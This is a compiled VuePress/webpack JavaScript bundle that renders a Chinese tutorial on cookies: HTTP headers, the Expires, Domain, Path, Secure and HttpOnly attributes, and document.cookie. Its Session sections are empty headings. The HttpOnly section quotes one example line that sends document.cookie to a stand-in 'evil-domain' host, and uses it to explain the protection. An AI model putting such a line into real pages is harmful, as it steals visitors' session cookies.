(window.webpackJsonp=window.webpackJsonp||[]).push([[43],{496:function(e,o,a){"use strict";a.r(o);var i=a(13),t=Object(i.a)({},(function(){var e=this,o=e._self._c;return o("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[o("h1",{attrs:{id:"会话保持"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#会话保持"}},[e._v("#")]),e._v(" 会话保持")]),e._v(" "),o("p",[e._v("学习目标")]),e._v(" "),o("ul",[o("li",[e._v("理解会话保持概念")]),e._v(" "),o("li",[e._v("理解 Cookie 的使用")]),e._v(" "),o("li",[e._v("理解 Session 的使用")])]),e._v(" "),o("h2",{attrs:{id:"概述"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#概述"}},[e._v("#")]),e._v(" 概述")]),e._v(" "),o("p",[e._v("Cookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过 4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。")]),e._v(" "),o("p",[e._v("Cookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。")]),e._v(" "),o("ul",[o("li",[o("p",[e._v("对话（session）管理：保存登录、购物车等需要记录的信息。")])]),e._v(" "),o("li",[o("p",[e._v("个性化：保存用户的偏好，比如网页的字体大小、背景色等等。")])]),e._v(" "),o("li",[o("p",[e._v("追踪：记录和分析用户行为。")])])]),e._v(" "),o("p",[e._v("有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐，因为 Cookie 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。")]),e._v(" "),o("p",[e._v("Cookie 包含以下几方面的信息。")]),e._v(" "),o("ul",[o("li",[o("p",[e._v("Cookie 的名字")])]),e._v(" "),o("li",[o("p",[e._v("Cookie 的值（真正的数据写在这里面）")])]),e._v(" "),o("li",[o("p",[e._v("到期时间")])]),e._v(" "),o("li",[o("p",[e._v("所属域名（默认是当前域名）")])]),e._v(" "),o("li",[o("p",[e._v("生效的路径（默认是当前网址）")])])]),e._v(" "),o("p",[e._v("举例来说，用户访问网址"),o("code",[e._v("www.example.com")]),e._v("，服务器在浏览器写入一个 Cookie。这个 Cookie 就会包含"),o("code",[e._v("www.example.com")]),e._v("这个域名，以及根路径"),o("code",[e._v("/")]),e._v("。这意味着，这个 Cookie 对该域名的根路径和它的所有子路径都有效。如果路径设为"),o("code",[e._v("/forums")]),e._v("，那么这个 Cookie 只有在访问"),o("code",[e._v("www.example.com/forums")]),e._v("及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。")]),e._v(" "),o("p",[e._v("浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。"),o("code",[e._v("window.navigator.cookieEnabled")]),e._v("属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("// 浏览器是否打开 Cookie 功能\nwindow.navigator.cookieEnabled // true\n")])])]),o("p",[o("code",[e._v("document.cookie")]),e._v("属性返回当前网页的 Cookie。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("// 当前网页的 Cookie\ndocument.cookie\n")])])]),o("p",[e._v("不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过 30 个，每个 Cookie 的大小不能超过 4KB。超过限制以后，Cookie 将被忽略，不会被设置。")]),e._v(" "),o("p",[e._v("浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，"),o("code",[e._v("http://example.com")]),e._v("设置的 Cookie，可以被"),o("code",[e._v("https://example.com")]),e._v("读取。")]),e._v(" "),o("h2",{attrs:{id:"cookie-与-http-协议"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#cookie-与-http-协议"}},[e._v("#")]),e._v(" Cookie 与 HTTP 协议")]),e._v(" "),o("p",[e._v("Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。")]),e._v(" "),o("h3",{attrs:{id:"http-回应-cookie-的生成"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#http-回应-cookie-的生成"}},[e._v("#")]),e._v(" HTTP 回应：Cookie 的生成")]),e._v(" "),o("p",[e._v("服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个"),o("code",[e._v("Set-Cookie")]),e._v("字段。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("Set-Cookie:foo=bar\n")])])]),o("p",[e._v("上面代码会在浏览器保存一个名为"),o("code",[e._v("foo")]),e._v("的 Cookie，它的值为"),o("code",[e._v("bar")]),e._v("。")]),e._v(" "),o("p",[e._v("HTTP 回应可以包含多个"),o("code",[e._v("Set-Cookie")]),e._v("字段，即在浏览器生成多个 Cookie。下面是一个例子。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("HTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n\n[page content]\n")])])]),o("p",[e._v("除了 Cookie 的值，"),o("code",[e._v("Set-Cookie")]),e._v("字段还可以附加 Cookie 的属性。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>\nSet-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>\nSet-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>\nSet-Cookie: <cookie-name>=<cookie-value>; Secure\nSet-Cookie: <cookie-name>=<cookie-value>; HttpOnly\n")])])]),o("p",[e._v("上面的几个属性的含义，将在后文解释。")]),e._v(" "),o("p",[e._v("一个"),o("code",[e._v("Set-Cookie")]),e._v("字段里面，可以同时包括多个属性，没有次序的要求。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly\n")])])]),o("p",[e._v("下面是一个例子。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly\n")])])]),o("p",[e._v("如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的"),o("code",[e._v("key")]),e._v("、"),o("code",[e._v("domain")]),e._v("、"),o("code",[e._v("path")]),e._v("和"),o("code",[e._v("secure")]),e._v("都匹配。举例来说，如果原始的 Cookie 是用如下的"),o("code",[e._v("Set-Cookie")]),e._v("设置的。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("Set-Cookie: key1=value1; domain=example.com; path=/blog\n")])])]),o("p",[e._v("改变上面这个 Cookie 的值，就必须使用同样的"),o("code",[e._v("Set-Cookie")]),e._v("。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("Set-Cookie: key1=value2; domain=example.com; path=/blog\n")])])]),o("p",[e._v("只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("Set-Cookie: key1=value2; domain=example.com; path=/\n")])])]),o("p",[e._v("上面的命令设置了一个全新的同名 Cookie，但是"),o("code",[e._v("path")]),e._v("属性不一样。下一次访问"),o("code",[e._v("example.com/blog")]),e._v("的时候，浏览器将向服务器发送两个同名的 Cookie。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("Cookie: key1=value1; key1=value2\n")])])]),o("p",[e._v("上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。")]),e._v(" "),o("h3",{attrs:{id:"http-请求-cookie-的发送"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#http-请求-cookie-的发送"}},[e._v("#")]),e._v(" HTTP 请求：Cookie 的发送")]),e._v(" "),o("p",[e._v("浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的"),o("code",[e._v("Cookie")]),e._v("字段。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("Cookie: foo=bar\n")])])]),o("p",[e._v("上面代码会向服务器发送名为"),o("code",[e._v("foo")]),e._v("的 Cookie，值为"),o("code",[e._v("bar")]),e._v("。")]),e._v(" "),o("p",[o("code",[e._v("Cookie")]),e._v("字段可以包含多个 Cookie，使用分号（"),o("code",[e._v(";")]),e._v("）分隔。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("Cookie: name=value; name2=value2; name3=value3\n")])])]),o("p",[e._v("下面是一个例子。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("GET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry\n")])])]),o("p",[e._v("服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。")]),e._v(" "),o("ul",[o("li",[o("p",[e._v("Cookie 的各种属性，比如何时过期。")])]),e._v(" "),o("li",[o("p",[e._v("哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。")])])]),e._v(" "),o("h2",{attrs:{id:"cookie-的属性"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#cookie-的属性"}},[e._v("#")]),e._v(" Cookie 的属性")]),e._v(" "),o("h3",{attrs:{id:"expires-max-age"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#expires-max-age"}},[e._v("#")]),e._v(" Expires，Max-Age")]),e._v(" "),o("p",[o("code",[e._v("Expires")]),e._v("属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用"),o("code",[e._v("Date.prototype.toUTCString()")]),e._v("进行格式转换。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;\n")])])]),o("p",[e._v("如果不设置该属性，或者设为"),o("code",[e._v("null")]),e._v("，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。")]),e._v(" "),o("p",[o("code",[e._v("Max-Age")]),e._v("属性指定从现在开始 Cookie 存在的秒数，比如"),o("code",[e._v("60 * 60 * 24 * 365")]),e._v("（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。")]),e._v(" "),o("p",[e._v("如果同时指定了"),o("code",[e._v("Expires")]),e._v("和"),o("code",[e._v("Max-Age")]),e._v("，那么"),o("code",[e._v("Max-Age")]),e._v("的值将优先生效。")]),e._v(" "),o("p",[e._v("如果"),o("code",[e._v("Set-Cookie")]),e._v("字段没有指定"),o("code",[e._v("Expires")]),e._v("或"),o("code",[e._v("Max-Age")]),e._v("属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。")]),e._v(" "),o("h3",{attrs:{id:"domain-path"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#domain-path"}},[e._v("#")]),e._v(" Domain，Path")]),e._v(" "),o("p",[o("code",[e._v("Domain")]),e._v("属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前域名，这时子域名将不会附带这个 Cookie。比如，"),o("code",[e._v("example.com")]),e._v("不设置 Cookie 的"),o("code",[e._v("domain")]),e._v("属性，那么"),o("code",[e._v("sub.example.com")]),e._v("将不会附带这个 Cookie。如果指定了"),o("code",[e._v("domain")]),e._v("属性，那么子域名也会附带这个 Cookie。如果服务器指定的域名不属于当前域名，浏览器会拒绝这个 Cookie。")]),e._v(" "),o("p",[o("code",[e._v("Path")]),e._v("属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，"),o("code",[e._v("Path")]),e._v("属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，"),o("code",[e._v("PATH")]),e._v("属性是"),o("code",[e._v("/")]),e._v("，那么请求"),o("code",[e._v("/docs")]),e._v("路径也会包含该 Cookie。当然，前提是域名必须一致。")]),e._v(" "),o("h3",{attrs:{id:"secure-httponly"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#secure-httponly"}},[e._v("#")]),e._v(" Secure，HttpOnly")]),e._v(" "),o("p",[o("code",[e._v("Secure")]),e._v("属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的"),o("code",[e._v("Secure")]),e._v("属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。")]),e._v(" "),o("p",[o("code",[e._v("HttpOnly")]),e._v("属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是"),o("code",[e._v("document.cookie")]),e._v("属性、"),o("code",[e._v("XMLHttpRequest")]),e._v("对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v('(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;\n')])])]),o("p",[e._v("上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的"),o("code",[e._v("HttpOnly")]),e._v("属性，上面代码就不会读到该 Cookie。")]),e._v(" "),o("h2",{attrs:{id:"在浏览器中操作-cookie"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#在浏览器中操作-cookie"}},[e._v("#")]),e._v(" 在浏览器中操作 Cookie")]),e._v(" "),o("h3",{attrs:{id:"document-cookie"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#document-cookie"}},[e._v("#")]),e._v(" document.cookie")]),e._v(" "),o("p",[o("code",[e._v("document.cookie")]),e._v("属性用于读写当前网页的 Cookie。")]),e._v(" "),o("p",[e._v("读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有"),o("code",[e._v("HTTPOnly")]),e._v("属性。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v('document.cookie // "foo=bar;baz=bar"\n')])])]),o("p",[e._v("上面代码从"),o("code",[e._v("document.cookie")]),e._v("一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("var cookies = document.cookie.split(';');\n\nfor (var i = 0; i < cookies.length; i++) {\n  console.log(cookies[i]);\n}\n// foo=bar\n// baz=bar\n")])])]),o("p",[o("code",[e._v("document.cookie")]),e._v("属性是可写的，可以通过它为当前网站添加 Cookie。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("document.cookie = 'fontSize=14';\n")])])]),o("p",[e._v("写入的时候，Cookie 的值必须写成"),o("code",[e._v("key=value")]),e._v("的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用"),o("code",[e._v("encodeURIComponent")]),e._v("方法达到。")]),e._v(" "),o("p",[e._v("但是，"),o("code",[e._v("document.cookie")]),e._v("一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("document.cookie = 'test1=hello';\ndocument.cookie = 'test2=world';\ndocument.cookie\n// test1=hello;test2=world\n")])])]),o("p",[o("code",[e._v("document.cookie")]),e._v("读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，"),o("code",[e._v("Cookie")]),e._v("字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，"),o("code",[e._v("Set-Cookie")]),e._v("字段是一行设置一个 Cookie。")]),e._v(" "),o("p",[e._v("写入 Cookie 的时候，可以一起写入 Cookie 的属性。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v('document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";\n')])])]),o("p",[e._v("上面代码中，写入 Cookie 的时候，同时设置了"),o("code",[e._v("expires")]),e._v("属性。属性值的等号两边，也是不能有空格的。")]),e._v(" "),o("p",[e._v("各个属性的写入注意点如下。")]),e._v(" "),o("ul",[o("li",[o("p",[o("code",[e._v("path")]),e._v("属性必须为绝对路径，默认为当前路径。")])]),e._v(" "),o("li",[o("p",[o("code",[e._v("domain")]),e._v("属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是"),o("code",[e._v("example.com")]),e._v("，就不能将其设为"),o("code",[e._v("foo.com")]),e._v("。该属性默认为当前的一级域名（不含二级域名）。")])]),e._v(" "),o("li",[o("p",[o("code",[e._v("max-age")]),e._v("属性的值为秒数。")])]),e._v(" "),o("li",[o("p",[o("code",[e._v("expires")]),e._v("属性的值为 UTC 格式，可以使用"),o("code",[e._v("Date.prototype.toUTCString()")]),e._v("进行日期格式转换。")])])]),e._v(" "),o("p",[o("code",[e._v("document.cookie")]),e._v("写入 Cookie 的例子如下。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("document.cookie = 'fontSize=14; '\n  + 'expires=' + someDate.toGMTString() + '; '\n  + 'path=/subdirectory; '\n  + 'domain=*.example.com';\n")])])]),o("p",[e._v("Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。")]),e._v(" "),o("p",[e._v("删除一个现存 Cookie 的唯一方法，是设置它的"),o("code",[e._v("expires")]),e._v("属性为一个过去的日期。")]),e._v(" "),o("div",{staticClass:"language-plain extra-class"},[o("pre",{pre:!0,attrs:{class:"language-plain"}},[o("code",[e._v("document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';\n")])])]),o("p",[e._v("上面代码中，名为"),o("code",[e._v("fontSize")]),e._v("的 Cookie 的值为空，过期时间设为 1970 年 1 月 1 月零点，就等同于删除了这个 Cookie。")]),e._v(" "),o("h3",{attrs:{id:"js-cookie"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#js-cookie"}},[e._v("#")]),e._v(" js-cookie")]),e._v(" "),o("p",[o("a",{attrs:{href:"https://github.com/js-cookie/js-cookie",target:"_blank",rel:"noopener noreferrer"}},[e._v("https://github.com/js-cookie/js-cookie"),o("OutboundLink")],1)]),e._v(" "),o("h2",{attrs:{id:"在-node-中操作-cookie"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#在-node-中操作-cookie"}},[e._v("#")]),e._v(" 在 Node 中操作 Cookie")]),e._v(" "),o("h2",{attrs:{id:"session"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#session"}},[e._v("#")]),e._v(" Session")]),e._v(" "),o("h2",{attrs:{id:"cookie-和-session-的区别"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#cookie-和-session-的区别"}},[e._v("#")]),e._v(" Cookie 和 Session 的区别")]),e._v(" "),o("h2",{attrs:{id:"参考资料"}},[o("a",{staticClass:"header-anchor",attrs:{href:"#参考资料"}},[e._v("#")]),e._v(" 参考资料")]),e._v(" "),o("ul",[o("li",[o("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies",target:"_blank",rel:"noopener noreferrer"}},[e._v("https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies"),o("OutboundLink")],1)])])])}),[],!1,null,null,null);o.default=t.exports}}]);